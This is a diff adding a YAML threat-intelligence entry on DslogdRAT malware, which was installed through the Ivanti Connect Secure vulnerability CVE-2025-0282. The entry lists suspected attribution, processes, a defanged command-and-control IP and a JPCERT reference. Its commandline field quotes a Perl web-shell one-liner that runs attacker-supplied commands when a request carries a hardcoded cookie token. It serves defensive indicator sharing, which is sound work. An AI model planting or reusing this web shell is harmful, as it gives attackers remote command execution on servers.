@@ -1,0 +1,45 @@
+description: DslogdRAT malware installed via Ivanti Connect Secure vulnerability CVE-2025-0282,
+  along with a Perl-based web shell.
+attribution:
+- UNC5221 (suspected)
+malware_families:
+- DslogdRAT
+- SPAWNSNARE
+TTPs:
+  processes:
+  - perl
+  - dslogdrat
+  commandline:
+  - perl -e "use CGI; my $cookie_str = $ENV{HTTP_COOKIE}; if($cookie_str =~ /DSAUTOKEN=([\";]+)/)
+    {if($1 eq 'af95380019083db5') {print CGI::header( -type => 'text/html' ); my $data
+    = CGI::param('data); system($data);} exit;}"
+  powershell:
+  - ''
+  scripting_engine:
+  - perl
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: dslogdrat
+    destination_address: 3.112.192[.]119
+    port: ''
+  file_activity:
+  - /path/to/web_shell.pl
+  - /path/to/dslogdrat.exe
+  persistence: []
+  pipes: []
+  process_relations:
+  - dslogdrat -> child_process (decodes config) -> worker_thread (communication &
+    command execution)
+IOCs:
+  hashes:
+  - ''
+  IPs:
+  - 3.112.192[.]119
+  domains: []
+  URLs: []
+authors:
+- 増渕 維摩(Yuma Masubuchi)
+reference: https://blogs.jpcert.or.jp/en/2025/04/dslogdrat.html
+date_of_publication: April 24, 2025
+file_creation_date: August 12, 2025
